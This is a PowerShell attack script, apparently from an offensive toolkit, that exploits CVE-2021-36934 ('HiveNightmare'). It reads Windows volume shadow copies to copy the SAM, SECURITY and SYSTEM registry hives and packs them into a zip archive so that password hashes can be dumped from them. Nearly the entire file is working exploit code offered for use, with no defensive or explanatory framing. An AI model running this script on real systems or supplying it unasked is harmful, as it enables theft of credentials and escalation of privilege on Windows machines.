Function PSHiveNightmare() {
<#
.SYNOPSIS
CVE-2021-36934 Vulnerability

.DESCRIPTION
This payload uses the VSS to copy the HIVE files which could be used to dump password hashes from it. 
The default path used for HIVE is C:\Windows\System32\config\

.PARAMETER DEST
The path where the files would be saved. It must already exist.

.EXAMPLE
PS > PSHiveNightmare
Saves the files in current run location of the payload and compress archive as HiveArchive.zip

.Example
PS > HiveNightmare -Dest C:\temp
Saves the files in C:\temp and compress archive as HiveArchive.zip

.LINK
https://github.com/GossiTheDog/HiveNightmare
https://github.com/wolf0x/HiveNightmare

.NOTES
Code by wolf0x

#>


    [cmdletbinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [string]$Dest
    )

    $depth=99
    $youngest = Get-date "1/1/1601 8:00:00 AM"
    $base = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"

    For ($i=1; $i -le $depth; $i++){
        $tbase = $base + $i + "\Windows\System32\Config\SAM"
        
        try{
            $sDate = [System.IO.File]::GetLastWriteTime($tbase)
            if ($youngest -lt $sDate){
                $youngest = $sDate
                Write-Host "Newer file found on No.$i, $tbase"
                break
            }
        }
        catch{
            Write-Error "Not This Number"
        }
    }
    $SAMpath = "$pwd\SAM"
    $SYSTEMpath = "$pwd\SYSTEM"
    $SECURITYpath = "$pwd\SECURITY"
    $ARCHfile = "$pwd\HiveArchive.zip"
    if ($Dest)
    {
        $SAMpath = "$Dest\SAM"
        $SYSTEMpath = "$Dest\SYSTEM"
        $SECURITYpath = "$Dest\SECURITY"
        $ARCHfile = "$Dest\HiveArchive.zip"
    }
    write-host $ARCHfile

    if ($i -ne 0){
        $bufSize = 1024kb

        $SAMbase = $base + $i.ToString() + "\Windows\System32\Config\SAM"
        $fileStream = [System.IO.File]::OpenRead($SAMbase)

        $sw = [System.IO.File]::OpenWrite($SAMpath)
        $chunk = New-Object byte[] $bufSize
        while ( $bytesRead = $fileStream.Read($chunk, 0, $bufSize) ){
            $sw.write($chunk, 0, $bytesRead)
            $sw.Flush()
            }
        $fileStream.Close()
        $sw.Close()
        Start-Sleep -Milliseconds 20
        
        $SECURITYbase = $base + $i.ToString() + "\Windows\System32\Config\SECURITY"
        $fileStream = [System.IO.File]::OpenRead($SECURITYbase)

        $sw = [System.IO.File]::OpenWrite($SECURITYpath)
        $chunk = New-Object byte[] $bufSize
        while ( $bytesRead = $fileStream.Read($chunk, 0, $bufSize) ){
            $sw.write($chunk, 0, $bytesRead)
            $sw.Flush()
            }
        $fileStream.Close()
        $sw.Close()
        Start-Sleep -Milliseconds 20

        $SYSTEMbase = $base + $i.ToString() + "\Windows\System32\Config\SYSTEM"
        $fileStream = [System.IO.File]::OpenRead($SYSTEMbase)

        $sw = [System.IO.File]::OpenWrite($SYSTEMpath)
        $chunk = New-Object byte[] $bufSize
        while ( $bytesRead = $fileStream.Read($chunk, 0, $bufSize) ){
            $sw.write($chunk, 0, $bytesRead)
            $sw.Flush()
            }
        $fileStream.Close()
        $sw.Close()
        
        $compress = @{
        LiteralPath= $SAMpath, $SYSTEMpath, $SECURITYpath
        CompressionLevel = "Fastest"
        DestinationPath = $ARCHfile
        }
        Compress-Archive @compress
    }
}

